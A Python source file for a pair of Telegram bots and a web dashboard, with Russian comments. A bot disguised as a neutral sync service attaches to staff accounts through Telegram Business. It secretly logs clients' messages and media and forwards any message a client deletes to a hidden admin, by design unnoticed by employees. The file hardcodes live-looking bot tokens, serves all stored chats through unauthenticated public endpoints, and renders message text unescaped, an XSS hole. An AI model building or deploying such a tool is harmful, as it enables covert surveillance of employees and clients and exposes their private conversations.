import asyncio
import os
import aiosqlite
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher
from aiogram.types import Message, BusinessMessagesDeleted, BusinessConnection
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

# 1. Рабочий бот-агент с новым нейтральным юзернеймом
WORKER_BOT_TOKEN = "9037468297:AAHcgo_p0YCXt5YW6YFPkStZ5iv-l-7tGRs"

# 2. Твой личный пульт управления
ADMIN_BOT_TOKEN = "9016978475:AAErV3MiXNyRhXFJns_b6ybiEGtAXmIaG48"

# Твой личный Telegram ID
MY_ADMIN_ID = 8026731485

# Адрес сервиса на Render
WEBAPP_URL = "https://btgm11-1.onrender.com"

worker_bot = Bot(token=WORKER_BOT_TOKEN)
admin_bot = Bot(token=ADMIN_BOT_TOKEN)

dp_worker = Dispatcher()
dp_admin = Dispatcher()

DB_FILE = "multi_crm.db"

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                connection_id TEXT PRIMARY KEY,
                user_id INTEGER,
                account_name TEXT
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS messages (
                message_id INTEGER,
                chat_id INTEGER,
                connection_id TEXT,
                sender_name TEXT,
                username TEXT,
                content_type TEXT,
                text_or_caption TEXT,
                file_id TEXT,
                is_deleted INTEGER DEFAULT 0,
                created_at TEXT,
                PRIMARY KEY (message_id, chat_id)
            )
        """)
        await db.commit()

# ==========================================
# 1. РАБОЧИЙ БОТ (БЕЗ ПАЛЕВА ДЛЯ СОТРУДНИКОВ)
# ==========================================

@dp_worker.message(CommandStart())
async def worker_start(message: Message):
    await message.answer("Служба бизнес-синхронизации активна.")

@dp_worker.business_connection()
async def worker_business_connection(connection: BusinessConnection):
    conn_id = connection.id
    user = connection.user
    acc_name = f"{user.full_name} (@{user.username})" if user.username else user.full_name

    async with aiosqlite.connect(DB_FILE) as db:
        if connection.is_enabled:
            await db.execute(
                "INSERT OR REPLACE INTO accounts (connection_id, user_id, account_name) VALUES (?, ?, ?)",
                (conn_id, user.id, acc_name)
            )
            try:
                await admin_bot.send_message(
                    chat_id=MY_ADMIN_ID,
                    text=f"🟢 <b>Подключен рабочий профиль:</b>\n👤 {acc_name}\nID: <code>{user.id}</code>",
                    parse_mode="HTML"
                )
            except Exception as e:
                print(f"Ошибка отправки алерта: {e}")
        else:
            await db.execute("DELETE FROM accounts WHERE connection_id = ?", (conn_id,))
            try:
                await admin_bot.send_message(
                    chat_id=MY_ADMIN_ID,
                    text=f"🔴 <b>Отключен рабочий профиль:</b>\n👤 {acc_name}",
                    parse_mode="HTML"
                )
            except Exception as e:
                print(f"Ошибка отправки алерта: {e}")
        await db.commit()

@dp_worker.business_message()
async def worker_cache_message(message: Message):
    conn_id = message.business_connection_id

    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT user_id FROM accounts WHERE connection_id = ?", (conn_id,)) as cursor:
            row = await cursor.fetchone()
            if row and message.from_user.id == row[0]:
                return

    chat_id = message.chat.id
    msg_id = message.message_id
    sender = message.from_user.full_name
    username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"

    content_type = "text"
    file_id = None
    caption = message.caption or ""

    if message.text:
        content_type = "text"
        text_or_caption = message.text
    elif message.voice:
        content_type = "voice"
        file_id = message.voice.file_id
        text_or_caption = caption
    elif message.video_note:
        content_type = "video_note"
        file_id = message.video_note.file_id
        text_or_caption = caption
    elif message.photo:
        content_type = "photo"
        file_id = message.photo[-1].file_id
        text_or_caption = caption
    elif message.video:
        content_type = "video"
        file_id = message.video.file_id
        text_or_caption = caption
    elif message.document:
        content_type = "document"
        file_id = message.document.file_id
        text_or_caption = caption
    else:
        content_type = "other"
        text_or_caption = "[Медиа другого типа]"

    timestamp = datetime.now().strftime("%H:%M:%S")

    async with aiosqlite.connect(DB_FILE) as db:
        await db.execute(
            """INSERT OR REPLACE INTO messages 
               (message_id, chat_id, connection_id, sender_name, username, content_type, text_or_caption, file_id, is_deleted, created_at) 
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0, ?)""",
            (msg_id, chat_id, conn_id, sender, username, content_type, text_or_caption, file_id, timestamp)
        )
        await db.commit()

@dp_worker.deleted_business_messages()
async def worker_deleted_messages(event: BusinessMessagesDeleted):
    chat_id = event.chat.id
    conn_id = event.business_connection_id

    async with aiosqlite.connect(DB_FILE) as db:
        acc_name = "Неизвестный профиль"
        async with db.execute("SELECT account_name FROM accounts WHERE connection_id = ?", (conn_id,)) as cursor:
            acc_row = await cursor.fetchone()
            if acc_row:
                acc_name = acc_row[0]

        for msg_id in event.message_ids:
            async with db.execute(
                """SELECT sender_name, username, content_type, text_or_caption, file_id 
                   FROM messages WHERE message_id = ? AND chat_id = ?""",
                (msg_id, chat_id)
            ) as cursor:
                row = await cursor.fetchone()
                if row:
                    sender, username, c_type, text, file_id = row
                    await db.execute(
                        "UPDATE messages SET is_deleted = 1 WHERE message_id = ? AND chat_id = ?",
                        (msg_id, chat_id)
                    )

                    header = (
                        f"🗑 <b>УДАЛЕНО СООБЩЕНИЕ</b>\n"
                        f"💼 <b>Аккаунт:</b> {acc_name}\n"
                        f"👤 <b>Клиент:</b> {sender} ({username})"
                    )

                    try:
                        if c_type == "text":
                            await admin_bot.send_message(
                                chat_id=MY_ADMIN_ID, 
                                text=f"{header}\n💬 <b>Текст:</b>\n{text}", 
                                parse_mode="HTML"
                            )
                        elif c_type == "voice":
                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n🎤 <b>Голосовое:</b>", parse_mode="HTML")
                            await admin_bot.send_voice(chat_id=MY_ADMIN_ID, voice=file_id, caption=text)
                        elif c_type == "video_note":
                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n📹 <b>Кружочек:</b>", parse_mode="HTML")
                            await admin_bot.send_video_note(chat_id=MY_ADMIN_ID, video_note=file_id)
                        elif c_type == "photo":
                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n🖼 <b>Фото:</b>", parse_mode="HTML")
                            await admin_bot.send_photo(chat_id=MY_ADMIN_ID, photo=file_id, caption=text)
                        elif c_type == "video":
                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n🎥 <b>Видео:</b>", parse_mode="HTML")
                            await admin_bot.send_video(chat_id=MY_ADMIN_ID, video=file_id, caption=text)
                        elif c_type == "document":
                            await admin_bot.send_message(chat_id=MY_ADMIN_ID, text=f"{header}\n📁 <b>Документ:</b>", parse_mode="HTML")
                            await admin_bot.send_document(chat_id=MY_ADMIN_ID, document=file_id, caption=text)
                    except Exception as e:
                        print(f"Ошибка отправки сообщения админу: {e}")
        await db.commit()

# ==========================================
# 2. АДМИН-БОТ (ПУЛЬТ РУКОВОДИТЕЛЯ)
# ==========================================

@dp_admin.message(CommandStart())
async def admin_start(message: Message):
    if message.from_user.id != MY_ADMIN_ID:
        await message.answer("Доступ запрещен.")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text="📱 Открыть CRM диалогов", 
            web_app=WebAppInfo(url=WEBAPP_URL)
        )]
    ])
    await message.answer("👋 Панель управления чатами готова к работе:", reply_markup=kb)

# ==========================================
# 3. ВЕБ-ПРИЛОЖЕНИЕ (MINI APP)
# ==========================================

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CRM Мониторинг</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg: #0f0f11;
            --card: #18181b;
            --card-border: #27272a;
            --primary: #3b82f6;
            --text-main: #f4f4f5;
            --text-muted: #71717a;
            --danger: #ef4444;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--bg);
            color: var(--text-main);
            margin: 0;
            padding: 16px;
        }
        .header { font-size: 19px; font-weight: 700; margin-bottom: 14px; }
        .accounts-scroll {
            display: flex;
            gap: 8px;
            overflow-x: auto;
            padding-bottom: 8px;
            margin-bottom: 16px;
        }
        .acc-pill {
            background: var(--card);
            border: 1px solid var(--card-border);
            color: var(--text-muted);
            padding: 8px 16px;
            border-radius: 9999px;
            font-size: 13px;
            font-weight: 500;
            white-space: nowrap;
            cursor: pointer;
        }
        .acc-pill.active {
            background: var(--primary);
            color: #ffffff;
            border-color: var(--primary);
        }
        .chat-card {
            background: var(--card);
            border: 1px solid var(--card-border);
            border-radius: 12px;
            padding: 12px;
            margin-bottom: 10px;
            cursor: pointer;
        }
        .chat-title {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 15px;
            font-weight: 600;
        }
        .username { font-size: 12px; color: var(--text-muted); font-weight: normal; margin-left: 4px; }
        .chat-feed {
            display: none;
            margin-top: 12px;
            border-top: 1px solid var(--card-border);
            padding-top: 10px;
        }
        .msg {
            background: #202024;
            padding: 8px 12px;
            border-radius: 8px;
            margin-bottom: 8px;
            font-size: 13px;
        }
        .msg.is-del {
            border-left: 3px solid var(--danger);
            background: rgba(239, 68, 68, 0.1);
        }
        .badge-del {
            color: var(--danger);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            float: right;
        }
        .time { font-size: 10px; color: var(--text-muted); margin-top: 4px; }
    </style>
</head>
<body>
    <div class="header">🏢 Рабочие аккаунты</div>
    <div class="accounts-scroll" id="accs"></div>
    <div id="chats">Загрузка данных...</div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        let activeConn = "";

        async function init() {
            let res = await fetch('/api/accounts');
            let accs = await res.json();
            let bar = document.getElementById('accs');
            bar.innerHTML = "";

            if (!accs.length) {
                document.getElementById('chats').innerHTML = "<div style='color:var(--text-muted)'>Нет привязанных рабочих аккаунтов.</div>";
                return;
            }

            accs.forEach((a, i) => {
                let btn = document.createElement('button');
                btn.className = 'acc-pill' + (i === 0 ? ' active' : '');
                btn.innerText = a.account_name;
                btn.onclick = () => {
                    document.querySelectorAll('.acc-pill').forEach(x => x.classList.remove('active'));
                    btn.classList.add('active');
                    activeConn = a.connection_id;
                    fetchChats(activeConn);
                };
                bar.appendChild(btn);
            });

            activeConn = accs[0].connection_id;
            fetchChats(activeConn);
        }

        async function fetchChats(connId) {
            let container = document.getElementById('chats');
            container.innerHTML = "<div style='color:var(--text-muted)'>Синхронизация...</div>";
            let res = await fetch('/api/messages?connection_id=' + connId);
            let data = await res.json();

            if (!Object.keys(data).length) {
                container.innerHTML = "<div style='color:var(--text-muted)'>Диалогов пока нет.</div>";
                return;
            }

            container.innerHTML = "";
            for (let cId in data) {
                let client = data[cId];
                let card = document.createElement('div');
                card.className = 'chat-card';

                let msgs = client.messages.map(m => `
                    <div class="msg ${m.is_deleted ? 'is-del' : ''}">
                        ${m.is_deleted ? '<span class="badge-del">Удалено клиентом</span>' : ''}
                        <div>${m.text}</div>
                        <div class="time">${m.time}</div>
                    </div>
                `).join('');

                card.innerHTML = `
                    <div class="chat-title">
                        <span>${client.name} <span class="username">${client.username}</span></span>
                        <span style="font-size:12px;color:var(--text-muted)">${client.messages.length} сообщ.</span>
                    </div>
                    <div class="chat-feed" id="feed-${cId}">${msgs}</div>
                `;

                card.onclick = () => {
                    let feed = document.getElementById('feed-' + cId);
                    feed.style.display = feed.style.display === 'block' ? 'none' : 'block';
                };

                container.appendChild(card);
            }
        }

        init();
    </script>
</body>
</html>
"""

async def web_index(request):
    return web.Response(text=HTML_TEMPLATE, content_type='text/html')

async def web_api_accounts(request):
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute("SELECT connection_id, account_name FROM accounts") as cursor:
            rows = await cursor.fetchall()
            return web.json_response([{"connection_id": r[0], "account_name": r[1]} for r in rows])

async def web_api_messages(request):
    conn_id = request.query.get('connection_id', '')
    async with aiosqlite.connect(DB_FILE) as db:
        async with db.execute(
            """SELECT chat_id, sender_name, username, text_or_caption, is_deleted, created_at 
               FROM messages WHERE connection_id = ? ORDER BY message_id ASC""", 
            (conn_id,)
        ) as cursor:
            rows = await cursor.fetchall()
            result = {}
            for row in rows:
                c_id, sender, username, text, is_del, time_str = row
                if c_id not in result:
                    result[c_id] = {"name": sender, "username": username, "messages": []}
                result[c_id]["messages"].append({
                    "text": text,
                    "is_deleted": bool(is_del),
                    "time": time_str
                })
            return web.json_response(result)

async def start_server():
    app = web.Application()
    app.router.add_get('/', web_index)
    app.router.add_get('/api/accounts', web_api_accounts)
    app.router.add_get('/api/messages', web_api_messages)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def main():
    await init_db()
    await start_server()
    print("Система запущена!")
    
    await asyncio.gather(
        dp_worker.start_polling(
            worker_bot, 
            allowed_updates=["message", "business_message", "deleted_business_messages", "business_connection"]
        ),
        dp_admin.start_polling(
            admin_bot, 
            allowed_updates=["message"]
        )
    )

if __name__ == "__main__":
    asyncio.run(main())
